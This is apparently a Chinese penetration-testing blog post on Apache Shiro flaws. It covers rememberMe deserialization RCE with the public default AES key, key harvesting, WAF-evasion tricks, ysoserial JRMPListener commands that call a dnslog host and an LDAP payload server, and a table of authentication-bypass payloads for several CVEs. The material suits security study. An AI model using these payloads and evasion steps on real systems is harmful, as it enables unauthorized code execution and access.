---
title: Shiro漏洞
date: 2023/5/3 15:00:25
categories:
- 漏洞复现
tags:
- 框架漏洞
---



# Shiro概述

​	Apache Shiro是一个开源**安全框架**，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。

​	通常与tomcat一起使用，也可以替换spring security集成到spring中（如若依）。



# 框架特征

在请求包的Cookie中有rememberMe字段赋任意值，收到返回包的 Set-Cookie 中存在`rememberMe=deleteMe`字段，说明目标有使用Shiro框架

![image-20230623161016099](../../../images/image-20230623161016099.png)



# 反序列化漏洞

​	Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。

在服务端对rememberMe的cookie值的处理

```java
RememberMe Cookie值 => base64解码 => AES解密 => 反序列化
```

**如果知道AES的密钥**就可以构造恶意`cookie`，从而造成反序列化RCE漏洞。所以这也是shiro反序列化经久不衰的原因。

payload生成

```java
恶意类 => 序列化 => AES加密 => base64编码
```



## shiro-550

​	Apache Shiro 1.2.5之前的版本在`org.apache.shiro.mgt.AbstractRememberMeManager`中存在AES默认秘钥`kPH+bIxk5D2deZiIxcaaaA==`。

​	在之后的版本，密钥为随机生成的，但是挡不住开发人员的安全意识不到位。



## shiro-721

- 概述

​	Apache Shiro 1.4.2之前的版本默认使用AES/CBC/PKCS5Padding模式加密，该加密模式存在缺陷，当攻击者**获得一个有效的rememberMe Cookie值时**，可以通过Padding Oracle Attack构造有效的恶意序列化数据来发起攻击。

- 复现

  > 参考[inspiringz/Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com)](https://github.com/inspiringz/Shiro-721)
  >
  > 注意点：因为爆破的时间太长（几个小时），不适用于实际环境的测试。会把环境打崩或者ip被ban

  - 正常登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。
  - 使用RememberMe cookie作为Padding Oracle Attack的前缀。
  - 加密 ysoserial 的序列化 payload，通过Padding Oracle Attack制作恶意RememberMe。
  - 重放恶意RememberMe cookie，以执行反序列化攻击。

- 修复

  在之后的版本加密模式 AES-CBC被更换为 AES-GCM，所以在使用工具等时需要注意该加密模式的变化。



# 反序列化漏洞常见问题

## 密钥获取

- github收集

  ```
  securityManager.rememberMeManager.cipherKey
  cookieRememberMeManager.setCipherKey
  setCipherKey(Base64.decode
  ```

- 任意文件读取/下载

- heapdump

- 爆破

  使用一个空的 `SimplePrincipalCollection`作为 payload，序列化后使用待检测的秘钥进行加密并发送。

  当密钥正确时**不返回**deleteMe 

  ![image-20230909224050081](../../../images/image-20230909224050081.png)

  密钥错误时**返回** deleteMe

  ![image-20230909224225905](../../../images/image-20230909224225905.png)

  还有一种情况，如果秘钥正确返回的是一个 `deleteMe`，密钥错误返回的是两个 `deleteMe`。

## WAF绕过

### cookie内容检测

- Tomcat 9.0.19

  插入\x0d

  ![img](../../../images/7.png)

- 插入Base64垃圾数据绕过（FUZZ）

![image-20230909230652318](../../../images/image-20230909230652318.png)

![image-20230909230621472](../../../images/image-20230909230621472.png)

![image-20230909230736285](../../../images/image-20230909230736285.png)

- 未知http请求

  未知http请求时，shiro是先处理cookie后在到servlet，所以rememberMe值是会处理的
  
  ![image-20230930210650227](../../../images/image-20230930210650227.png)

### 请求头大小被限制

> tomcat默认header最大长度设置为8192字节
>
> 人为对Cookie长度进行限制
>
> 解决思路：
>
> ![image-20230910143028324](../../../images/image-20230910143028324.png)
>
> - [shiro的payload长度限制绕过-CSDN博客](https://blog.csdn.net/Thunderclap_/article/details/128932553)
> - [浅析Shiro反序列化Payload长度绕过 (qq.com)](https://mp.weixin.qq.com/s/OY9x2EYqIxPNABwGQNVkcw)

#### 第一种解决方法复现

Tomcat允许的HTTP Header最大值`maxHttpHeaderSize`

header过长，服务端报400错误

![image-20230930165929950](../../../images/image-20230930165929950.png)

![image-20230930170008618](../../../images/image-20230930170008618.png)

**构造header头的类构造器**

![image-20230930174546037](../../../images/image-20230930174546037.png)

**构造CB链进行序列化**

![image-20230930174635485](../../../images/image-20230930174635485.png)

**将test.bin文件进行处理**

![image-20230930175016176](../../../images/image-20230930175016176.png)

**生成外部字节码内容**

```bash
public class CalcTest {
    public CalcTest() throws Exception {
        Runtime.getRuntime().exec("calc");
    }
}

javac CalcTest.java
cat CalcTest.class |base64|sed ':label;N;s/\n//;b label'
```

**发送payload**

![image-20230930175509511](../../../images/image-20230930175509511.png)

**人家工具已经实现了**

注入内存马

![image-20230930180023456](../../../images/image-20230930180023456.png)





## 有key无链

>  用现在公开的 dns或者延迟探测 爆破试探存在的class包 工具都现成的 
>
> 然后根据存在的包判断版本差异自己构造组合链 都知道官方链方便盯着关键函数，通用的rce链基本都藏着官方修复都没得玩 
>
> 现在比较多的是利用第三方服务比如mysql redis jdbc 通过有限操作的链去利用

链子多的工具：shiro-tool ，经常识别出JRMP Cilent（🥦🐕只会用工具）

[shiro反序列漏洞中JRMPClient利用 (qq.com)](https://mp.weixin.qq.com/s/Hm2HA4G2r6ZFgxdddJ6Puw)

[shiro JRMP gadget | BlogPapers (sumsec.me)](https://sumsec.me/2021/shiro-JRMP-gadget.html)

ysoserial起JRMP服务

```bash
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "ping w3dh1h.dnslog.cn"

java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar  ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 "ldap://ip:1389/Basic/Command/Whoami"
```



由于Shiro重写了resolveClass方法，将原生方法中的forName方法替换为loadClass方法，由于loadClass无法加载数组类型的类，因此存在Transformer[]类的CommonCollections gadget无法成功利用此漏洞，（例如ysoserial CommonCollections1、CommonCollections3）

思路：

![image-20220221183250833](../../../images/1645693858000-8awcri.png-w331s)

**shiro默认是没有cc依赖的，但是存在commons-beanutils 1.8.3依赖**



## 工具识别问题

- 比如302跳转，burp插件识别出来了，但是工具识别不出来

  解决：工具走burp代理，将响应302改为200



# 身份验证绕过漏洞

## shiro权限管理原理

**Shiro的认证授权流程**

![20230628170326-a47052ce-1592-1](../../../images/20230628170326-a47052ce-1592-1.png)

> 当我们的用户(subject)去认证的时候，用户携带我们的身份信息，凭据信息，也就是我们的用户名和密码
>
> Shiro会将我们的用户名和密码封装成一个Token
>
> 然后通过安全管理器(SecurityManager)
>
> 安全管理器(SecurityManager)去调用认证器(Authenticator)
>
> 认证器(Authenticator)去调用我们的Realm去获取数据，然后进行比对，如果对比成功的话，那么就认证成功了，否则认证失败。
>
> 认证成功后会调用授权器（Authorizer）来判断这个用户身份有什么权限，他可以访问哪些资源。
>
> ```
> SessionManager是一个会话管理器，，shiro框架定义了一套会话管理， 它不依赖web容器的session，所以shiro可以使用在非web 应用上，也可以将分布式应用的会话集中在一点管理，此 特性可使它实现单点登录。
> ```
>
> ```
> SessionDAO其实就是会话，比如要将Session存储到数据库，那么可以通过jdbc来存储到数据库。
> ```

Spring+Shiro关键代码

**shiro.ini**

```ini
[users]
user=user,user
admin=admin,admin

[roles]
admin=*
user=user
```

定义了两个用户和两个角色。其中，admin角色拥有所有权限，而user角色只拥有user权限。这意味着admin用户具有所有权限，而user用户仅具有user权限

**Filter链**

```java
ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean();
//给filter设置安全管理器
shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager);

//配置路径访问
Map<String,String> map = new HashMap<String,String>();
map.put("/secret.html", "authc, roles[admin]");	
map.put("/**", "anon");

//默认认证界面路径---当认证不通过时跳转
shiroFilterFactoryBean.setLoginUrl("/login.html");
shiroFilterFactoryBean.setUnauthorizedUrl("/unauthorized.html");

// 设置URL路径与过滤器的映射关系
shiroFilterFactoryBean.setFilterChainDefinitionMap(map);
```

**解释**

所有以 `/` 开头的路径（包括子路径）都可以匿名访问，无需认证和授权。但是，只有经过认证的用户并有`admin` 角色授权才能访问 `/secret.html` 路径，当未经身份验证的用户访问需要身份验证的资源如`/secret.html`时将被重定向到`/login.html`，当经过身份验证的用户（user）访问不符合其访问权限的资源`/secret.html`时将被重定向到`/unauthorized.html`

```java
// AntPathMatcher匹配规则
?  匹配任意一个单字符
*  匹配任意数量的字符 即/admin/* 可以匹配 /admin/a 但是不能匹配 /admin/b/c/d
** 匹配一个或多个目录 即/admin/** 可以匹配 /admin/a 或者 /admin/b/c/d 等请求
    
// 常见过滤器
anon（匿名访问）：允许匿名访问，不需要认证。
authc（身份验证）：要求用户进行身份验证（登录）才能访问。
user（记住我或身份验证通过）：用户已进行身份验证或选择了记住我功能可访问。
perms（权限控制）：要求用户具有特定的权限才能访问。
roles（角色控制）：要求用户具有特定的角色才能访问。
port（端口控制）：要求请求的端口与指定的端口匹配才能访问。
ssl（SSL安全）：要求请求通过SSL/TLS协议进行安全访问。
rest（RESTful风格支持）：为RESTful API提供支持。

// ShiroFilterFactoryBean常用方法
setLoginUrl(String loginUrl) 设置登录页面的URL未经身份验证的用户访问需要身份验证的资源时将被重定向到该URL
setSuccessUrl(String successUrl) 设置成功登录后跳转的URL
setUnauthorizedUrl(String unauthorizedUrl) 设置未授权页面的URL，当用户没有访问权限时将被重定向到该URL
```



## 身份验证绕过

**大部分权限绕过都源自于Spring和Shiro对请求处理的不一致导致的。**

[Shiro 历史漏洞分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/11633#toc-37)

|      编号      |                版本影响                 | 鉴权路径 |                         绕过payload                          |                           后端配置                           |
| :------------: | :-------------------------------------: | :------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
| CVE-2023-22602 | Apache Shiro < 1.11.0，Spring Boot>=2.6 |  /admin  |                          /admin/..                           |                                                              |
| CVE-2022-32532 |              Shiro < 1.9.1              |  /admin  |                    /admin/%0d，/admin/%0a                    |              RegExPatternMatcher` && `/admin/.*              |
| CVE-2020-1957  |              Shiro <1.5.2               |  /admin  |               /xxx/..;/admin/（xxx为授权路径）               |                                                              |
| CVE-2016-6802  |               shrio<1.3.2               |  /admin  |              /xxx/../admin（xxx随意不存在也行）              |                                                              |
| CVE-2020-11989 |              shiro < 1.5.3              |  /admin  | (shiro等于1.5.2）     /admin%25%32%66（%25%32%66为/的双重url编码）                                      (shiro小于1.5.3）/;/admin | (shiro等于1.5.2）`/admin/* = authc`；                                          (shiro小于1.5.3）`/admin/* = authc && /** = anon` |
| CVE-2020-13933 |              Shiro < 1.6.0              |  /admin  |               /admin/%3Bxxx（xxx为随意字符串）               |                       /admin/* = authc                       |
| CVE-2020-17510 |              Shiro < 1.7.0              |  /admin  |                          /admin/%2e                          |                       /admin/* = authc                       |
| CVE-2020-17523 |              Shiro < 1.7.1              |  /admin  |                          /admin%20                           |                       /admin/* = authc                       |





# 参考文章

[Shiro 组件漏洞与攻击链分析](https://paper.seebug.org/1378/)

[Shiro RememberMe 漏洞检测的探索之路](https://paper.seebug.org/1285/)

[Shiro反序列化漏洞笔记五（对抗篇） (changxia3.com)](http://changxia3.com/2022/05/09/Shiro反序列化漏洞笔记五（对抗篇）/#rememberMe值绕过)

[shiro反序列化绕WAF之未知HTTP请求方法 | 回忆飘如雪 (gv7.me)](https://gv7.me/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/)

[shiro权限绕过总结 (qq.com)](https://mp.weixin.qq.com/s/KGjylebaJnu7UB_Atqj4Sw)

[Shiro从入门到权限绕过漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/12643)

